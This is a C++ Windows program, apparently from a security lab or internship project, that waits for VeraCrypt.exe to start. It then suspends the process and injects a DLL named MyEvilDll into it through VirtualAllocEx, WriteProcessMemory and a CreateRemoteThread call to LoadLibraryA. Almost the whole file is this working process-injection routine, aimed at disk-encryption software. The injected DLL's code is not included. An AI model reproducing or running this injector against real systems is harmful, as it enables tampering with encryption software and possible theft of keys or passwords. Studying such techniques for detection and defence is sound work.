#include <Windows.h>
#include<stdio.h>
#include <WtsApi32.h>   // for the WTS* functions
#include <sddl.h>
#include<conio.h>
#include<atlstr.h>

#pragma comment(lib, "Wtsapi32.lib")

typedef LONG(NTAPI* NtSuspendProcess)(IN HANDLE ProcessHandle);
typedef LONG(NTAPI* NtResumeProcess)(IN HANDLE ProcessHandle);

INT wmain() {

	PWTS_PROCESS_INFOW procInfo;
	DWORD dwCount = 0;
	LPSTR sid;
	INT nrOfProcesses = 0;
	char a = 'a';


	HMODULE hK32 = HMODULE();
	hK32 = GetModuleHandleW(L"kernel32.dll");

	if (NULL == hK32)
	{
		return GetLastError();
	}


	PVOID pfnLoadLibraryA = PVOID();
	pfnLoadLibraryA = GetProcAddress(hK32, "LoadLibraryA");

	if (!pfnLoadLibraryA)
	{
		return GetLastError();
	}



	while (1) {

	

	if (WTSEnumerateProcessesW(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &procInfo, &dwCount)) {
#ifdef _DEBUG
		wprintf_s(L"Success to Enumerate process \n");
#endif // _DEBUG
	}
	else {
#ifdef _DEBUG
		wprintf_s(L"Failed to Enumerate process \n");
#endif // _DEBUG
		return GetLastError();
	}

	//print resoults

	for (int i = 0; i < dwCount; i++) {
		nrOfProcesses = i;
		if (wcscmp(procInfo[i].pProcessName, L"VeraCrypt.exe") == 0) {
			wprintf_s(L"I have got a proces that you were looking for\n");
			HANDLE hTargetProcess = HANDLE();
			DWORD Pid = procInfo[i].ProcessId; //enter a pid you would like to inject
			printf("[*] %s: Obtaining handle to target process with PID: %ld\n", __FUNCTION__, Pid);
			hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);

			if (hTargetProcess == NULL)
			{
				//return GetLastError();
			}
			else {
				printf("[+] %s: Process handle (0x%p) obtained!\n", __FUNCTION__, hTargetProcess);
			}

			//suspending a process
			
			NtSuspendProcess pfnNtSuspendProcess = (NtSuspendProcess)GetProcAddress(GetModuleHandle(L"ntdll"), "NtSuspendProcess");
			pfnNtSuspendProcess(hTargetProcess);

	
			


			//mydllinjection
			PUCHAR RemoteBuffer = {};
			CStringA DllPath = "C:\\Users\\analyst\\Desktop\\praktyki\\PROJEKT\\MyEvilDll\\x64\\Debug\\MyEvilDll.dll";
			 //CStringA DllPath = "C:\\Users\\analyst\\Desktop\\praktyki\\PROJEKT\\ValidatorDll\\x64\\Debug\\ValidatorDll.dll";
			SIZE_T DllPathLen = (strlen(DllPath) + 1);
			printf(" %s: Allocating memory in target process...\n", __FUNCTION__);
			RemoteBuffer = (PUCHAR)VirtualAllocEx(hTargetProcess, NULL, DllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			//
			// error check
			//
			if (!RemoteBuffer)
			{
				return GetLastError();
			}

			printf(" %s: Allocation successful: 0x%p of %Iu bytes\n", __FUNCTION__, RemoteBuffer, DllPathLen);

			printf(" %s: Check with debugger or Process Hacker at this point to read process memory\n", __FUNCTION__);


			//Injection of Dll
			SIZE_T NumberOfBytesWritten = 0L;
			BOOL Retval = FALSE;
			printf("[*] %s: Attempting to write the DLL path to the newly allocated buffer...\n", __FUNCTION__);
			Retval = WriteProcessMemory(hTargetProcess, RemoteBuffer, DllPath, DllPathLen, &NumberOfBytesWritten);

			if (!Retval)
			{

				return GetLastError();
			}
			printf("[+] %s: Succesfully wrote %Iu bytes to 0x%p\n", __FUNCTION__, DllPathLen, RemoteBuffer);



			//creation of a remote thread to run dll
			ULONG ThreadId = 0L;
			HANDLE hRemoteThread = HANDLE();
			printf("[*] %s: Creating the remote thread to trigger DllMain...\n", __FUNCTION__);
			hRemoteThread = CreateRemoteThread(
				hTargetProcess,
				0,
				0,
				(LPTHREAD_START_ROUTINE)pfnLoadLibraryA,
				RemoteBuffer,
				0,
				&ThreadId
			);




			if (!hRemoteThread)
			{
				return GetLastError();
			}

			printf("[+] %s: Successfully created remote thread: 0x%p ID: 0x%08x\n", __FUNCTION__, hRemoteThread, ThreadId);

			WaitForSingleObject(hRemoteThread, INFINITE);

		
			CloseHandle(hRemoteThread);

			//Sleep(6600);

			//Resume process
			NtResumeProcess pfnNtResumeProcess = (NtResumeProcess)GetProcAddress(GetModuleHandle(L"ntdll"), "NtResumeProcess");
			pfnNtResumeProcess(hTargetProcess);
			



			//NtResumeProcess(hTargetProcess);
			CloseHandle(hTargetProcess);
			WTSFreeMemory(procInfo);
			printf("[+]Work Ends Here\n");
			return 0;
			
		}

	}


	//wprintf_s(L"Number of processes = %d \n", nrOfProcesses + 1);

	//free the memory
	//WTSFreeMemory(procInfo);
	
	}

	return 0;
}

